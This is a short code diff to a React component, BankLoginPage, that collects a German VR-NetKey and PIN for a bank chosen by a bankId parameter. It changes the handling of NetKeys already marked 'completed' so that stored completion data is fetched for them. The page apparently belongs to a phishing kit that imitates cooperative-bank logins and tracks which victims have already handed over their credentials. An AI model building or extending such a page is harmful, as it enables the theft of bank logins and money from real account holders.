@@ -469,10 +469,16 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
 
-    if (isNetkeyCompleted(vrNetKey.trim())) {
-      setErrorMsg("Für diesen VR-NetKey wurde der Vorgang bereits abgeschlossen. Eine erneute Anmeldung ist nicht möglich.");
+    const nk = vrNetKey.trim();
+    if (isNetkeyCompleted(nk)) {
+      setErrorMsg(null);
+      setAlreadyDone({ stage: "prompt", data: null });
+      void fetchNetkeyCompletion(nk).then((data) => {
+        setAlreadyDone((cur) => (cur ? { ...cur, data } : cur));
+      });
       return;
     }
+
 
 
     setSubmitting(true);
